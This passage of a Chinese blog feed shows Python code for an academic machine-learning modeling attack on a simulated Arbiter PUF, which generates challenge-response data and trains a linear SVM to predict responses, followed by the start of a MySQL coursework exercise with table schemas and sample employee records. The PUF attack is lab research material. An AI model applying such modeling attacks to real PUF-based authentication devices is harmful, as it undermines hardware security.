class="number">14</span>)</span><br><span class="line">        plt.plot(avg_cost)</span><br><span class="line">        plt.plot(train_accuracy)</span><br><span class="line">        plt.plot(test_accuracy)</span><br><span class="line">        plt.legend([<span class="string">'loss'</span>, <span class="string">'train_accuracy'</span>, <span class="string">'test_accuracy'</span>])</span><br><span class="line">        plt.ylim(<span class="number">0.</span>, <span class="number">1.5</span>)</span><br><span class="line">        <span class="comment">#plt.savefig('AC8.png', dpi=300)</span></span><br><span class="line">        plt.xlabel(<span class="string">"Epochs"</span>)</span><br><span class="line">        plt.ylabel(<span class="string">"Rate"</span>)</span><br><span class="line">        plt.show()</span><br></pre></td></tr></table></figure><p>最后的正确率可以达到98。</p><h1 id="六、SVM建模攻击代码实现"><a href="#六、SVM建模攻击代码实现" class="headerlink" title="六、SVM建模攻击代码实现"></a>六、SVM建模攻击代码实现</h1><h3 id="数据收集实现：-1"><a href="#数据收集实现：-1" class="headerlink" title="数据收集实现："></a>数据收集实现：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tensorflow <span class="keyword">as</span> tf</span><br><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shape</span><span class="params">(M)</span>:</span></span><br><span class="line">  <span class="keyword">return</span> len(M), len(M[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">out1 = open(<span class="string">'testdatasetin.csv'</span>, <span class="string">'w'</span>)</span><br><span class="line">out2 = open(<span class="string">'testdatasetout.csv'</span>, <span class="string">'w'</span>)</span><br><span class="line">csv_writer1 = csv.writer(out1)</span><br><span class="line">csv_writer2 = csv.writer(out2)</span><br><span class="line">csv_file = csv.reader(open(<span class="string">'仿真Arbiter_PUF.csv'</span>, <span class="string">'r'</span>))</span><br><span class="line"></span><br><span class="line">PUFdelay_np = []</span><br><span class="line">PUFdelay = []</span><br><span class="line">delay1 = <span class="number">0</span></span><br><span class="line">delay2 = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> csv_file:</span><br><span class="line">    PUFdelay.append(i)</span><br><span class="line"></span><br><span class="line">PUFdelay_np = np.array(PUFdelay, dtype=float)</span><br><span class="line"></span><br><span class="line">C_np = [([<span class="number">0</span>] * <span class="number">64</span>) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>)]</span><br><span class="line">C_np_csv = []</span><br><span class="line">seed = <span class="string">"01"</span></span><br><span class="line">counter1 = <span class="number">0</span></span><br><span class="line">counter11 = <span class="number">0</span></span><br><span class="line"><span class="comment">#counter0 = 0</span></span><br><span class="line">counter = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> counter != <span class="number">12500</span>:</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">64</span>):</span><br><span class="line">binary = random.choice(seed)</span><br><span class="line"><span class="keyword">if</span> binary == <span class="string">"1"</span>:</span><br><span class="line">delaymiddle = delay2</span><br><span class="line">delay2 = delay1</span><br><span class="line">delay1 = delaymiddle</span><br><span class="line">delay1 += float(PUFdelay[<span class="number">1</span>][i])</span><br><span class="line">delay2 += float(PUFdelay[<span class="number">2</span>][i])</span><br><span class="line">C_np[<span class="number">0</span>][i] = <span class="number">0</span></span><br><span class="line">C_np[<span class="number">3</span>][i] = <span class="number">0</span></span><br><span class="line">counter1 += <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> counter1 % <span class="number">2</span> != <span class="number">0</span>:</span><br><span class="line">C_np[<span class="number">1</span>][i] = <span class="number">1</span></span><br><span class="line">C_np[<span class="number">2</span>][i] = <span class="number">-1</span></span><br><span class="line"><span class="keyword">if</span> counter1 % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">C_np[<span class="number">1</span>][i] = <span class="number">-1</span></span><br><span class="line">C_np[<span class="number">2</span>][i] = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> binary == <span class="string">"0"</span>:</span><br><span class="line">delay1 += float(PUFdelay[<span class="number">0</span>][i])</span><br><span class="line">delay2 += float(PUFdelay[<span class="number">3</span>][i])</span><br><span class="line">C_np[<span class="number">1</span>][i] = <span class="number">0</span></span><br><span class="line">C_np[<span class="number">2</span>][i] = <span class="number">0</span></span><br><span class="line"><span class="comment">#counter0 += 1</span></span><br><span class="line"><span class="keyword">if</span> counter1 % <span class="number">2</span> != <span class="number">0</span>:</span><br><span class="line">C_np[<span class="number">0</span>][i] = <span class="number">-1</span></span><br><span class="line">C_np[<span class="number">3</span>][i] = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> counter1 % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">C_np[<span class="number">0</span>][i] = <span class="number">1</span></span><br><span class="line">C_np[<span class="number">3</span>][i] = <span class="number">-1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">64</span>):</span><br><span class="line">C_np_csv.append(C_np[i][j])</span><br><span class="line">csv_writer1.writerow(C_np_csv)</span><br><span class="line"><span class="keyword">if</span> counter1 % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line"><span class="keyword">if</span>(delay1 &gt; delay2):</span><br><span class="line">csv_writer2.writerow(<span class="string">"1"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">row = [<span class="number">-1</span>]</span><br><span class="line">csv_writer2.writerow(row)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">if</span>(delay1 &lt;= delay2):</span><br><span class="line">csv_writer2.writerow(<span class="string">"1"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">row = [<span class="number">-1</span>]</span><br><span class="line">csv_writer2.writerow(row)</span><br><span class="line">counter1 = <span class="number">0</span></span><br><span class="line">delay1 = <span class="number">0</span></span><br><span class="line">delay2 = <span class="number">0</span></span><br><span class="line">C_np_csv = []</span><br><span class="line">counter += <span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="SVM建模攻击实现："><a href="#SVM建模攻击实现：" class="headerlink" title="SVM建模攻击实现："></a>SVM建模攻击实现：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> tensorflow <span class="keyword">as</span> tf</span><br><span class="line"><span class="keyword">from</span> sklearn <span class="keyword">import</span> datasets</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pylab <span class="keyword">import</span> mpl</span><br><span class="line">mpl.rcParams[<span class="string">'font.sans-serif'</span>] = [<span class="string">'SimHei'</span>]</span><br><span class="line"></span><br><span class="line">np.random.seed(<span class="number">1</span>)</span><br><span class="line">tf.set_random_seed(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">sess = tf.Session()</span><br><span class="line"></span><br><span class="line"><span class="comment">#产生数据</span></span><br><span class="line">x_vals = np.loadtxt(open(<span class="string">r"testdatasetin.csv"</span>, <span class="string">"r"</span>), delimiter=<span class="string">","</span>, skiprows=<span class="number">0</span>)</span><br><span class="line">y_vals = np.loadtxt(open(<span class="string">r"testdatasetout.csv"</span>, <span class="string">"r"</span>), delimiter=<span class="string">","</span>, skiprows=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#划分数据为训练集和测试集</span></span><br><span class="line">train_indices = np.random.choice(len(x_vals), round(len(x_vals)*<span class="number">0.8</span>), replace=<span class="keyword">False</span>)</span><br><span class="line">test_indices = np.array(list(set(range(len(x_vals))) - set(train_indices)))</span><br><span class="line">x_vals_train = x_vals[train_indices]</span><br><span class="line">x_vals_test = x_vals[test_indices]</span><br><span class="line">y_vals_train = y_vals[train_indices]</span><br><span class="line">y_vals_test = y_vals[test_indices]</span><br><span class="line"><span class="comment">#批训练中批的大小</span></span><br><span class="line">batch_size = <span class="number">100</span></span><br><span class="line"><span class="comment"># 初始化feedin</span></span><br><span class="line">x_data = tf.placeholder(shape=[<span class="keyword">None</span>, <span class="number">256</span>], dtype=tf.float32)</span><br><span class="line">y_target = tf.placeholder(shape=[<span class="keyword">None</span>, <span class="number">1</span>], dtype=tf.float32)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建变量</span></span><br><span class="line">W = tf.Variable(tf.random_normal(shape=[<span class="number">256</span>, <span class="number">1</span>]))</span><br><span class="line">b = tf.Variable(tf.random_normal(shape=[<span class="number">1</span>, <span class="number">1</span>]))</span><br><span class="line"><span class="comment"># 定义线性模型</span></span><br><span class="line">model_output = tf.matmul(x_data, W)+b</span><br><span class="line"><span class="comment"># Declare vector L2 'norm' function squared</span></span><br><span class="line">l2_norm = tf.reduce_sum(tf.square(W))</span><br><span class="line"><span class="comment">#软正则化参数</span></span><br><span class="line">alpha = tf.constant([<span class="number">0.02</span>])</span><br><span class="line"><span class="comment">#定义损失函数</span></span><br><span class="line">classification_term = tf.reduce_mean(tf.maximum(<span class="number">0.</span>, <span class="number">1.</span>-model_output*y_target))</span><br><span class="line">loss = classification_term+alpha*l2_norm</span><br><span class="line"><span class="comment"># classification_term = tf.reduce_mean(tf.maximum(0., tf.subtract(1., tf.multiply(model_output, y_target))))</span></span><br><span class="line"><span class="comment"># loss = tf.add(classification_term, tf.multiply(alpha, l2_norm))</span></span><br><span class="line"><span class="comment">#输出</span></span><br><span class="line">prediction = tf.sign(model_output)</span><br><span class="line">accuracy = tf.reduce_mean(tf.cast(tf.equal(prediction, y_target), tf.float32))</span><br><span class="line">train_step = tf.train.GradientDescentOptimizer(<span class="number">0.01</span>).minimize(loss)</span><br><span class="line"><span class="comment">#开始训练</span></span><br><span class="line">sess.run(tf.global_variables_initializer())</span><br><span class="line">loss_vec = []</span><br><span class="line">train_accuracy = []</span><br><span class="line">test_accuracy = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2000</span>):</span><br><span class="line">    rand_index = np.random.choice(len(x_vals_train), size=batch_size)</span><br><span class="line">    rand_x = x_vals_train[rand_index]</span><br><span class="line">    rand_y = np.transpose([y_vals_train[rand_index]])</span><br><span class="line">    sess.run(train_step, feed_dict=&#123;x_data: rand_x, y_target: rand_y&#125;)</span><br><span class="line">    temp_loss = sess.run(loss, feed_dict=&#123;x_data: rand_x, y_target: rand_y&#125;)</span><br><span class="line">    loss_vec.append(temp_loss)</span><br><span class="line">    train_acc_temp = sess.run(accuracy, feed_dict=&#123;</span><br><span class="line">                              x_data: x_vals_train, y_target: np.transpose([y_vals_train])&#125;)</span><br><span class="line">    train_accuracy.append(train_acc_temp)</span><br><span class="line">    test_acc_temp = sess.run(accuracy, feed_dict=&#123;</span><br><span class="line">                             x_data: x_vals_test, y_target: np.transpose([y_vals_test])&#125;)</span><br><span class="line">    test_accuracy.append(test_acc_temp)</span><br><span class="line">    <span class="keyword">if</span> (i+<span class="number">1</span>) % <span class="number">100</span> == <span class="number">0</span>:</span><br><span class="line">        print(<span class="string">'Step #'</span> + str(i+<span class="number">1</span>) + <span class="string">' W = '</span> +</span><br><span class="line">              str(sess.run(W)) + <span class="string">'b = '</span> + str(sess.run(b)))</span><br><span class="line">        print(<span class="string">'Loss = '</span> + str(test_acc_temp))  <span class="comment"># test_acc_temp</span></span><br><span class="line">plt.plot(loss_vec)</span><br><span class="line">plt.plot(train_accuracy)</span><br><span class="line">plt.plot(test_accuracy)</span><br><span class="line">plt.legend([<span class="string">'损失'</span>, <span class="string">'训练精确度'</span>, <span class="string">'测试精确度'</span>])</span><br><span class="line">plt.ylim(<span class="number">0.</span>, <span class="number">1.</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p>最后的正确率会达到至少97.5%以上。</p><p>由于个人精力有限，不再分析tensorflow开源机器学习神器和内部算法实现。</p><p>​<br>​    </p><p>​<br>​<br>​    </p><p>​<br>​<br>​    </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;一、机器学习&quot;&gt;&lt;a href=&quot;#一、机器学习&quot; class=&quot;headerlink&quot; title=&quot;一、机器学习&quot;&gt;&lt;/a&gt;一、机器学习&lt;/h2&gt;&lt;p&gt;​    第一次接触机器学习，这个实验在做的过程中相当痛苦。在实验刚开始的很长一段时间内都没有建模的思路，而
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>SQL练习</title>
    <link href="http://yoursite.com/2018/04/19/SQL%E7%BB%83%E4%B9%A0/"/>
    <id>http://yoursite.com/2018/04/19/SQL练习/</id>
    <published>2018-04-18T23:38:03.000Z</published>
    <updated>2018-04-18T23:38:10.126Z</updated>
    
    <content type="html"><![CDATA[<h1 id="实验：数据查询-MySQL"><a href="#实验：数据查询-MySQL" class="headerlink" title="实验：数据查询-MySQL"></a>实验：数据查询-MySQL</h1><h2 id="一、实验目的"><a href="#一、实验目的" class="headerlink" title="一、实验目的"></a><strong>一、实验目的</strong></h2><p>l  了解MySQL查询编辑器的启动，熟悉如何在MySQL查询编辑器中查询记录。</p><p>l  掌握SELECT语句的基本语法和查询条件表示方法。</p><p>l  掌握GROUP BY 和ORDER BY 子句的作用和使用方法。</p><p>l  掌握连接查询和子查询的使用方法。</p><p>l  掌握复杂查询的使用方法。</p><h2 id="二、实验任务"><a href="#二、实验任务" class="headerlink" title="二、实验任务"></a><strong>二、实验任务</strong></h2><h3 id="1．新建一个数据库HRM，并在数据库HRM中，建立如下所示的三个表："><a href="#1．新建一个数据库HRM，并在数据库HRM中，建立如下所示的三个表：" class="headerlink" title="1．新建一个数据库HRM，并在数据库HRM中，建立如下所示的三个表："></a>1．新建一个数据库HRM，并在数据库HRM中，建立如下所示的三个表：</h3><p>Employee表</p><table><thead><tr><th>列名</th><th>数据类型</th><th>长度</th><th>是否允许为空</th><th>说明</th></tr></thead><tbody><tr><td>EmployeeID</td><td>Char</td><td>6</td><td>否</td><td>员工编号，主键</td></tr><tr><td>Name</td><td>Char</td><td>10</td><td>否</td><td>姓名</td></tr><tr><td>Birthday</td><td>Datetime</td><td>8</td><td>否</td><td>出生日期</td></tr><tr><td>Sex</td><td>Bit</td><td>1</td><td>否</td><td>性别</td></tr><tr><td>Address</td><td>Char</td><td>20</td><td>是</td><td>家庭地址</td></tr><tr><td>Zip</td><td>Char</td><td>6</td><td>是</td><td>邮编</td></tr><tr><td>PhoneNumber</td><td>Char</td><td>12</td><td>是</td><td>电话号码</td></tr><tr><td>EmailAddress</td><td>Char</td><td>30</td><td>是</td><td>电子邮件地址</td></tr><tr><td>DepartmentID</td><td>Char</td><td>3</td><td>否</td><td>员工部门号，外键</td></tr></tbody></table><p>Departments表</p><table><thead><tr><th>列名</th><th>数据类型</th><th>长度</th><th>是否允许为空</th><th>说明</th></tr></thead><tbody><tr><td>DepartmentID</td><td>Char</td><td>3</td><td>否</td><td>员工部门号，主键</td></tr><tr><td>DepartmentName</td><td>Char</td><td>20</td><td>否</td><td>部门名</td></tr><tr><td>Note</td><td>Text</td><td>16</td><td>是</td><td>备注</td></tr></tbody></table><p>Salary表</p><table><thead><tr><th>列名</th><th>数据类型</th><th>长度</th><th>是否允许为空</th><th>说明</th></tr></thead><tbody><tr><td>EmployeeID</td><td>Char</td><td>6</td><td>否</td><td>员工编号，外键</td></tr><tr><td>Income</td><td>Float</td><td>8</td><td>否</td><td>收入</td></tr><tr><td>OutCome</td><td>Float</td><td>8</td><td>否</td><td>支出</td></tr></tbody></table><h3 id="2．对上节建立的表输入数据："><a href="#2．对上节建立的表输入数据：" class="headerlink" title="2．对上节建立的表输入数据："></a>2．对上节建立的表输入数据：</h3><p>Departments表：</p><table><thead><tr><th>DepartmentID</th><th>DepartmentName</th><th>Note</th></tr></thead><tbody><tr><td>1</td><td>财务部</td><td>财务部</td></tr><tr><td>2</td><td>研发部</td><td>研发部</td></tr><tr><td>3</td><td>人力资源部</td><td>人力资源部</td></tr></tbody></table><p>Employee表</p><table><thead><tr><th>EmployeeID</th><th>Name</th><th>Birthday</th><th>Sex</th><th>Address</th><th>Zip</th><th>PhoneNumber</th><th>EmailAddress</th><th>DepartmentID</th></tr></thead><tbody><tr><td>1001</td><td>李勇</td><td>78-3-12</td><td>0</td><td>湖南岳阳</td><td>475001</td><td>3880378</td><td>ly@henu.edu.cn</td><td>1</td></tr><tr><td>1002</td><td>王敏</td><td>80-11-2</td><td>1</td><td>湖南衡阳</td><td>475002</td><td>0378311</td><td>wm@henu.edu.cn</td><td>1</td></tr><tr><td>1003</td><td>刘晨</td><td>78-6-22</td><td>0</td><td>湖南娄底</td><td>475003</td><td>0378322</td><td>lc@henu.edu.cn</td><td>1</td></tr><tr><td>2001</td><td>张立</td><td>78-8-1</td><td>0</td><td>湖南长沙</td><td>475004</td><td>0378333</td><td>zl@henu.edu.cn</td><td>2</td></tr><tr><td>2002</td><td>刘毅</td><td>82-1-23</td><td>0</td><td>湖南岳阳</td><td>475005</td><td>0378344</td><td>ly@henu.edu.cn</td><td>2</td></tr><tr><td>2003</td><td>张玫</td><td>81-3-15</td><td>1</td><td>湖南邵阳</td><td>475006</td><td>0378355</td><td>zm@henu.edu.cn</td><td>2</td></tr><tr><td>3001</td><td>徐静</td><td>76-8-12</td><td>1</td><td>河南洛阳</td><td>475007</td><td>0378366</td><td>xj@henu.edu.cn</td><td>3</td></tr><tr><td>3002</td><td>赵军</td><td>79-2-19</td><td>0</td><td>湖南岳阳</td><td>475008</td><td>0378377</td><td>zj@henu.edu.cn</td><td>3</td></tr></tbody></table><p>Salary表</p><table><thead><tr><th>EmployeeID</th><th>Income</th><th>OutCome</th></tr></thead><tbody><tr><td>1001</td><td>3600</td><td>1500</td></tr><tr><td>1002</td><td>3300</td><td>1000</td></tr><tr><td>1003</td><td>3700</td><td>1200</td></tr><tr><td>2001</td><td>4000</td><td>1600</td></tr><tr><td>2002</td><td>3800</td><td>1800</td></tr><tr><td>2003</td><td>3800</td><td>1500</td></tr><tr><td>3001</td><td>4200</td><td>2000</td></tr><tr><td>3002</td><td>4100</td><td>1800</td></tr></tbody></table><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SET</span> <span class="keyword">NAMES</span> utf8;</span><br><span class="line"><span class="keyword">SET</span> FOREIGN_KEY_CHECKS = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="comment">-- Table structure for Departments</span></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span> <span class="string">`Departments`</span>;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`Departments`</span> (</span><br><span class="line">  <span class="string">`DepartmentID`</span> <span class="built_in">char</span>(<span class="number">3</span>) <span class="keyword">COLLATE</span> utf8_unicode_ci <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'员工部门号，主键'</span>,</span><br><span class="line">  <span class="string">`DepartmentName`</span> <span class="built_in">char</span>(<span class="number">20</span>) <span class="keyword">COLLATE</span> utf8_unicode_ci <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'部门名'</span>,</span><br><span class="line">  <span class="string">`Note`</span> <span class="built_in">text</span> <span class="keyword">COLLATE</span> utf8_unicode_ci <span class="keyword">COMMENT</span> <span class="string">'备注'</span>,</span><br><span class="line">  PRIMARY <span class="keyword">KEY</span> (<span class="string">`DepartmentID`</span>)</span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8 <span class="keyword">COLLATE</span>=utf8_unicode_ci;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="comment">-- Records of Departments</span></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="keyword">BEGIN</span>;</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="string">`Departments`</span> <span class="keyword">VALUES</span> (<span class="string">'1'</span>, <span class="string">'财务部'</span>, <span class="string">'财务部'</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="string">`Departments`</span> <span class="keyword">VALUES</span> (<span class="string">'2'</span>, <span class="string">'研发部'</span>, <span class="string">'研发部'</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="string">`Departments`</span> <span class="keyword">VALUES</span> (<span class="string">'3'</span>, <span class="string">'人力资源部'</span>, <span class="string">'人力资源部'</span>);</span><br><span class="line"><span class="keyword">COMMIT</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="comment">-- Table structure for Employee</span></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span> <span class="string">`Employee`</span>;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`Employee`</span> (</span><br><span class="line">  <span class="string">`EmployeeID`</span> <span class="built_in">char</span>(<span class="number">6</span>) <span class="keyword">COLLATE</span> utf8_unicode_ci <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'员工编号，主键'</span>,</span><br><span class="line">  <span class="string">`Name`</span> <span class="built_in">char</span>(<span class="number">10</span>) <span class="keyword">COLLATE</span> utf8_unicode_ci <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'姓名'</span>,</span><br><span class="line">  <span class="string">`Birthday`</span> datetime(<span class="number">6</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'出生日期'</span>,</span><br><span class="line">  <span class="string">`Sex`</span> <span class="built_in">int</span>(<span class="number">2</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'性别'</span>,</span><br><span class="line">  <span class="string">`Address`</span> <span class="built_in">char</span>(<span class="number">20</span>) <span class="keyword">COLLATE</span> utf8_unicode_ci <span class="keyword">DEFAULT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'家庭地址'</span>,</span><br><span class="line">  <span class="string">`Zip`</span> <span class="built_in">char</span>(<span class="number">6</span>) <span class="keyword">COLLATE</span> utf8_unicode_ci <span class="keyword">DEFAULT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'邮编'</span>,</span><br><span class="line">  <span class="string">`PhoneNumber`</span> <span class="built_in">char</span>(<span class="number">12</span>) <span class="keyword">COLLATE</span> utf8_unicode_ci <span class="keyword">DEFAULT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'电话号码'</span>,</span><br><span class="line">  <span class="string">`EmailAddress`</span> <span class="built_in">char</span>(<span class="number">30</span>) <span class="keyword">COLLATE</span> utf8_unicode_ci <span class="keyword">DEFAULT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'电子邮件地址'</span>,</span><br><span class="line">  <span class="string">`DepartmentID`</span> <span class="built_in">char</span>(<span class="number">3</span>) <span class="keyword">COLLATE</span> utf8_unicode_ci <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'员工部门号，外键'</span>,</span><br><span class="line">  PRIMARY <span class="keyword">KEY</span> (<span class="string">`EmployeeID`</span>),</span><br><span class="line">  <span class="keyword">KEY</span> <span class="string">`foreign_key1`</span> (<span class="string">`DepartmentID`</span>),</span><br><span class="line">  <span class="keyword">CONSTRAINT</span> <span class="string">`foreign_key1`</span> FOREIGN <span class="keyword">KEY</span> (<span class="string">`DepartmentID`</span>) <span class="keyword">REFERENCES</span> <span class="string">`Departments`</span> (<span class="string">`DepartmentID`</span>) <span 